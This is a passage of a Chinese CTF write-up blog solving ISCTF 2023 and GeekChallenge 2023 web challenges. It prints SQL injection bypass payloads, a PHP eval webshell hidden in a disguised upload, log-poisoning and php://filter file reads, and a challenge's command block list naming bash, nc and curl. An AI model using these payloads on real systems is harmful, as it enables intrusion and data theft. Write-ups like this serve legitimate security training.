class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?z</span>hurong[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>最后preg_match用回溯次数限制绕过<br>在2023ISCTF前面加上好多个a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1000000</span>);<br></code></pre></td></tr></table></figure><p>这么多a就够了😊</p><h2 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h2><p>看到源码一开始以为是可以x一下的<br>试了很久没办法绕过实体编码<br>那就sql注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p>通过错误回显看到了or被过滤哩<br><img src="/images/LXOOWXC0IPUM2L.png"><br>而且空格也被过滤了，用%09代替<br><img src="/images/JUZPUNGKP7244PBVB.png"><br>双写成功绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">爆库<br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>database()#<br>//users<br>爆表<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>group_concat(table_name)<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>infoorrmation_schema.tables<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>table_schema<span class="hljs-operator">=</span>database()#<br>//users<br>爆字段<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>group_concat(column_name)<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>infoorrmation_schema.columns<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>table_name<span class="hljs-operator">=</span>&#x27;users&#x27;#<br>//用户$USER<span class="hljs-punctuation">,</span>CURRENT_CONNECTIONS<span class="hljs-punctuation">,</span>TOTAL_CONNECTIONS<span class="hljs-punctuation">,</span>user<span class="hljs-punctuation">,</span>password$登录成功<br>爆值<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>passwoorrd<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>users#<br>//<span class="hljs-number">21232</span>f<span class="hljs-number">297</span>a<span class="hljs-number">57</span>a<span class="hljs-number">5</span>a<span class="hljs-number">743894</span>a<span class="hljs-number">0e4</span>a<span class="hljs-number">801</span>fc<span class="hljs-number">3</span>：admin的md<span class="hljs-number">5</span>加密值<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>passwoorrd<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>users<span class="hljs-variable">%09</span>limit<span class="hljs-variable">%092</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>#<br>//用户$ISCTF&#123;<span class="hljs-keyword">c</span><span class="hljs-number">51</span>a<span class="hljs-number">3</span>cf<span class="hljs-number">4</span>-adf<span class="hljs-number">5</span><span class="hljs-number">-4</span>cd<span class="hljs-number">5</span><span class="hljs-number">-80</span>f<span class="hljs-number">3</span><span class="hljs-number">-30</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-keyword">c</span><span class="hljs-number">3262</span>bd&#125;$登录成功<br></code></pre></td></tr></table></figure><p>这里用联合注入有点问题，显示的不全，这题用报错注入要直观很多</p><h2 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<span class="hljs-comment">//strings</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;想读我文件？大胆。&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\^|\||\~|\\$|\%|jay/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;无字母数字RCE？大胆！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash|nc|curl|sess|\&#123;|:|;/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;奇技淫巧？大胆！！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;大胆！！！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>刚开始把这题想歪了，一顿无参rce。。。<br>这题唯一需要注意的就是 assert($_POST[‘code’]);<br>assert和eval功能相同，但assert不用在函数后面加<code>;</code><br>所以结果很简单</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">code=system(&#x27;ls /&#x27;)<br><span class="hljs-comment">//bin dev etc flaggggggg.txt home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br>没有禁/和&#x27;,那就随便绕过过滤了<br>code=system(&#x27;c\at /f*&#x27;)<br>//ISCTF&#123;437d25ca-b36f-<span class="hljs-number">4204</span>-b8af-<span class="hljs-number">7937</span>eab665a9&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h2><p>这题对文件内部的审查很严<br>所以我们直接用日志包含来获取<br>上传.user.ini</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">GIF89a<br>auto_prepend_file=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>抓包后再ua头后加入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//不能用&quot;&quot;，会报错</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以猜flag的位置直接获取<br>.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h2><p>show me your parameter!!!Wrong parameter!!!<br>仅有的一行hint提示我们需要一个正确的参数<br>抓包源代码什么的都没有发现可利用的信息<br>dirsearch扫扫，<br>扫出了一个index.bak文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">string_to_int_array</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-keyword">const</span> intArr = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;str.<span class="hljs-property">length</span>;i++)&#123;<br>          <span class="hljs-keyword">const</span> charcode = str.<span class="hljs-title function_">charCodeAt</span>(i);<span class="hljs-comment">/*返回字符串第一个字符的 Unicode 编码，这里直接理解为ascii码值*/</span><br><br>          <span class="hljs-keyword">const</span> partA = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(charcode / <span class="hljs-number">26</span>);<span class="hljs-comment">/*返回小于等于一个给定数字的最大整数，向下取整*/</span><br>          <span class="hljs-keyword">const</span> partB = charcode % <span class="hljs-number">26</span>;<br><br>          intArr.<span class="hljs-title function_">push</span>(partA);<span class="hljs-comment">/*这两行的意思是在数组末尾添加新元素*/</span><br>          intArr.<span class="hljs-title function_">push</span>(partB);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> intArr;<br>      &#125;<br><br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-params">int_array</span>)&#123;<br>        <span class="hljs-keyword">let</span> txt = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;int_array.<span class="hljs-property">length</span>;i++)&#123;<br>          txt += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">97</span> + int_array[i]);<span class="hljs-comment">/*返回ASCII码值对应的字符*/</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> txt;<br>      &#125;<br><br><br><span class="hljs-keyword">const</span> hash = <span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-title function_">string_to_int_array</span>(<span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-title function_">string_to_int_array</span>(parameter))));<br><span class="hljs-keyword">if</span>(hash === <span class="hljs-string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>)&#123;<br>            <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;flag.html&#x27;</span>;<br>          &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;fail&#x27;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>          &#125;<br><br></code></pre></td></tr></table></figure><p>是个JavaScript代码，上面已经给了函数所对应的意思<br>要使hash&#x3D;&#x3D;&#x3D;dxdydxdudxdtdxeadxekdxea才能获得我们要的<br>需要写一个脚本，先分析一下<br>嵌套函数，从最里面开始计算<br>计算过程如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> intarr[<span class="hljs-number">3</span>,<span class="hljs-number">19</span>]-&gt;txt=dt-&gt;intarr[<span class="hljs-number">3</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>]-&gt;txt=dwem<br><span class="hljs-attribute">b</span> intarr[<span class="hljs-number">3</span>,<span class="hljs-number">20</span>]-&gt;txt=du-&gt;intarr[<span class="hljs-number">3</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>]-&gt;txt=dwen<br></code></pre></td></tr></table></figure><p>也就是说，输入一个字符所对应的是hash所匹配的4个字符<br>dxdydxdudxdtdxeadxekdxea为24个字符，说明我们需要输入6个字符，莫非是mihoyo😋<br>基于上面的计算规则，写一个python脚本</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scss">import requests<br>import <span class="hljs-selector-tag">time</span><br><br><br>def <span class="hljs-built_in">string_to_int</span>(str):<br>    intarr = []<br>    for k in str:<br>        parta = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">ord</span>(k) / <span class="hljs-number">26</span>)<br>        partb = <span class="hljs-built_in">ord</span>(k) % <span class="hljs-number">26</span><br>        intarr.<span class="hljs-built_in">append</span>(parta)<br>        intarr.<span class="hljs-built_in">append</span>(partb)<br>    return intarr<br><br><br>def <span class="hljs-built_in">int_to_string</span>(intarr):<br>    txt = <span class="hljs-string">&#x27;&#x27;</span><br>    for j in intarr:<br>        txt = txt+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>+j)<br>    return txt<br><br><br>for i in <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:<br>    heheh = <span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(<span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(i))))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,heheh))<br><br><br>wtf=<span class="hljs-string">&#x27;mihoyo&#x27;</span><br>wco=<span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(<span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(wtf))))<br><span class="hljs-built_in">print</span>(wco)<br></code></pre></td></tr></table></figure><p>python脚本不用说，和上面js实现过程是一样的，直接看结果</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">a:</span>dwem<br><span class="hljs-symbol">b:</span>dwen<br><span class="hljs-symbol">c:</span>dweo<br><span class="hljs-symbol">d:</span>dwep<br><span class="hljs-symbol">e:</span>dweq<br><span class="hljs-symbol">f:</span>dwer<br><span class="hljs-symbol">g:</span>dwes<br><span class="hljs-symbol">h:</span>dxdt<br><span class="hljs-symbol">i:</span>dxdu<br><span class="hljs-symbol">j:</span>dxdv<br><span class="hljs-symbol">k:</span>dxdw<br><span class="hljs-symbol">l:</span>dxdx<br><span class="hljs-symbol">m:</span>dxdy<br><span class="hljs-symbol">n:</span>dxdz<br><span class="hljs-symbol">o:</span>dxea<br><span class="hljs-symbol">p:</span>dxeb<br><span class="hljs-symbol">q:</span>dxec<br><span class="hljs-symbol">r:</span>dxed<br><span class="hljs-symbol">s:</span>dxee<br><span class="hljs-symbol">t:</span>dxef<br><span class="hljs-symbol">u:</span>dxeg<br><span class="hljs-symbol">v:</span>dxeh<br><span class="hljs-symbol">w:</span>dxei<br><span class="hljs-symbol">x:</span>dxej<br><span class="hljs-symbol">y:</span>dxek<br><span class="hljs-symbol">z:</span>dxel<br><span class="hljs-symbol">A:</span>dveg<br><span class="hljs-symbol">B:</span>dveh<br><span class="hljs-symbol">C:</span>dvei<br><span class="hljs-symbol">D:</span>dvej<br><span class="hljs-symbol">E:</span>dvek<br><span class="hljs-symbol">F:</span>dvel<br><span class="hljs-symbol">G:</span>dvem<br><span class="hljs-symbol">H:</span>dven<br><span class="hljs-symbol">I:</span>dveo<br><span class="hljs-symbol">J:</span>dvep<br><span class="hljs-symbol">K:</span>dveq<br><span class="hljs-symbol">L:</span>dver<br><span class="hljs-symbol">M:</span>dves<br><span class="hljs-symbol">N:</span>dwdt<br><span class="hljs-symbol">O:</span>dwdu<br><span class="hljs-symbol">P:</span>dwdv<br><span class="hljs-symbol">Q:</span>dwdw<br><span class="hljs-symbol">R:</span>dwdx<br><span class="hljs-symbol">S:</span>dwdy<br><span class="hljs-symbol">T:</span>dwdz<br><span class="hljs-symbol">U:</span>dwea<br><span class="hljs-symbol">V:</span>dweb<br><span class="hljs-symbol">W:</span>dwec<br><span class="hljs-symbol">X:</span>dwed<br><span class="hljs-symbol">Y:</span>dwee<br><span class="hljs-symbol">Z:</span>dwef<br>dxdydxdudxdtdxeadxekdxea<br></code></pre></td></tr></table></figure><p>真的是mihoyo哎😍<br>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?mihoyo=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GeekChallenge_2023</title>
    <link href="/2023/11/14/GeekChallenge_2023/"/>
    <url>/2023/11/14/GeekChallenge_2023/</url>
    
    <content type="html"><![CDATA[<h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p>请post传参username和password进行登录<br>那么我们随便post<br>显示密码错误<br>查看源码发现密码被藏<br>在页面中查找没有结果<br>用dirsearch搜一下<br>搜到了robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/o2takuXX&#x27;s_username_and_password.txt<br></code></pre></td></tr></table></figure><p>进入获得账户密码，返回第一个界面输入</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin<br><span class="hljs-symbol">password:</span>@dm1N123456r00t<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>为了方便，后面都用burp抓包操作</p><ul><li><p>必须来源自sycsec.com<br>payload:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> sycsec.com<br></code></pre></td></tr></table></figure></li><li><p>请使用Syclover浏览器<br>payload:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: Syclover<br></code></pre></td></tr></table></figure></li><li><p>请从localhost访问<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>-forwarded-for: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure></li><li><p>请使用Syc.vip代理</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span><span class="hljs-variable">a:Syc</span>.vip<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_O2TAKUXX&#x27;</span>]==<span class="hljs-string">&quot;GiveMeFlag&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">O2TAKUXX:</span> GiveMeFlag<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">SYC&#123;<span class="hljs-symbol">HttP_1s_E@</span>sY&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/ZGK3XJNLBAXUZGWP.png"></p><h2 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h2><p>文件上传题<br>上传4.txt<br><img src="/images/C7VD364KWICUPM7QAE0Q.png"><br>txt被过滤了<br>上传4.php<br><img src="/images/I779FMMTZAWY1JKB1WX.png"><br>后缀过了，看来php没被过滤，但还是被过滤了什么导致没有上传成功</p><p>上传4.png<br><img src="/images/DTD1TGD123GY4R4ACLDL0.png"><br>正确的上传方式是这种<br>要检查后缀，头部，文件内容才能上传<br>接着回到上面的php<br>png是后缀头部都过，而php只过了后缀，把他们结合一下试试<br>上传4.png并抓包</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span> <span class="hljs-variable">@eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为对文件内容有检查，所以把php换为&#x3D;<br>抓包后把名字改为4.png.php<br><img src="/images/LLXNXV4N453.png"><br>通过<br>进入文件存储就就可以无障碍RCE了</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);<br><span class="hljs-comment">//bin dev etc flag flag.sh home lib media mnt proc root run sbin srv sys tmp usr var </span><br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-comment">//SYC&#123;mKs0jSTEiW7n47bMPz&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>]) &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>]) &#123;<br>            <span class="hljs-variable">$array1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>];<br>            <span class="hljs-variable">$array2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array2</span>)) &#123;<br>                <span class="hljs-keyword">if</span> 